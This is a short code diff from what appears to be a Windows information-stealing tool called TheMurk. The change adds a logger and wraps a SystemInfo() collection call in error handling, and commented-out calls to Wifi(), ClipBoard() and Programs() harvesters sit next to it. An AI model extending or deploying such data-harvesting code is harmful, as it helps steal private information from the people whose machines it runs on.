@@ -1,6 +1,7 @@
 from targets.targets import *
 from manager.manager import *
 from preferences.config import config
+from manager.logger import Log
 from sys import exit,argv
 from win32com.client import Dispatch
 from os.path import abspath
@@ -65,7 +66,8 @@ class TheMurk:
 
     
     def System(self):
-        self.msgInfo[0] = SystemInfo()
+        try: self.msgInfo[0] = SystemInfo()
+        except Exception as e: Log(f"SystemInfo ---> {e}")
         # Wifi()
         # ClipBoard()
         # Programs()
